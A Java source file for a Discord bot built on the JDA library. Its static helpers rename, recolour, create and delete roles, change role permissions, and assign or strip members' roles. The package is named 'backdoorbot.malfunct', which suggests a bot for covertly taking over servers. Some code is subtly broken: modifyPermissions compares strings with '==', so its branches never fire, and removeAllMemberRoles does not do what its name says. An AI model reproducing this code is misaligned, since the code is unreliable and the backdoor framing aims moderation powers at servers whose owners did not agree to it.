package llc.sapphire.backdoorbot.malfunct;

import net.dv8tion.jda.api.JDA;
import net.dv8tion.jda.api.Permission;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.Member;
import net.dv8tion.jda.api.entities.Role;
import net.dv8tion.jda.api.managers.RoleManager;
import net.dv8tion.jda.api.requests.restaction.RoleAction;

import java.awt.*;
import java.util.EnumSet;
import java.util.List;

public class Roles {

    public static List<Role> getRoles(JDA jda, long guildID){
        Guild guild = jda.getGuildById(guildID);
        return guild.getRoles();
    }

    public static void changeRoleName(JDA jda, long guildID, long roleID, String newName){
        Guild guild = jda.getGuildById(guildID);
        Role role = guild.getRoleById(roleID);

        RoleManager roleManager = role.getManager();
        roleManager.setName(newName);

        roleManager.queue();
    }

    public static void changeRoleColor(JDA jda, long guildID, long roleID, Color newColor){
        Guild guild = jda.getGuildById(guildID);
        Role role = guild.getRoleById(roleID);

        RoleManager roleManager = role.getManager();
        roleManager.setColor(newColor);

        roleManager.queue();
    }

    public static void displayRoleSeperatly(JDA jda, long guildID, long roleID){
        Guild guild = jda.getGuildById(guildID);
        Role role = guild.getRoleById(roleID);

        RoleManager roleManager = role.getManager();

        roleManager.setHoisted(true);
        roleManager.queue();
    }

    public static void modifyPermissions(JDA jda, long guildID, long roleID, String function, Permission permission){
        Guild guild = jda.getGuildById(guildID);
        Role role = guild.getRoleById(roleID);

        RoleManager roleManager = role.getManager();

        if(function.toLowerCase() == "revoke"){
            roleManager.revokePermissions(permission).queue();
        }else if(function.toLowerCase() == "give"){
            roleManager.givePermissions(permission).queue();
        }else{
            //do nothing
        }
    }

    public static void applyRoleToMember(JDA jda, long guildID, long roleID, long memberID){
        Guild guild = jda.getGuildById(guildID);
        Role role = guild.getRoleById(roleID);
        Member member = guild.getMemberById(memberID);

        guild.addRoleToMember(member, role).queue();
    }

    public static void removeRoleFromMember(JDA jda, long guildID, long roleID, long memberID){
        Guild guild = jda.getGuildById(guildID);
        Role role = guild.getRoleById(roleID);
        Member member = guild.getMemberById(memberID);

        guild.removeRoleFromMember(member, role).queue();
    }

    public static void removeAllMemberRoles(JDA jda, long guildID, long roleID, long memberID){
        Guild guild = jda.getGuildById(guildID);
        Role role = guild.getRoleById(roleID);
        Member member = guild.getMemberById(memberID);

        guild.modifyMemberRoles(member, role).queue();
    }

    public static void deleteRole(JDA jda, long guildID, long roleID){
        Guild guild = jda.getGuildById(guildID);
        Role role = guild.getRoleById(roleID);

        role.delete().queue();
    }

    public static void createRole(JDA jda, long guildID, String roleName, Color color, boolean mentionable, EnumSet<Permission> permissions){
        Guild guild = jda.getGuildById(guildID);

        RoleAction roleAction = guild.createRole()
                .setName(roleName)
                .setColor(color)
                .setMentionable(mentionable)
                .setPermissions(permissions);

        roleAction.queue();
    }
}
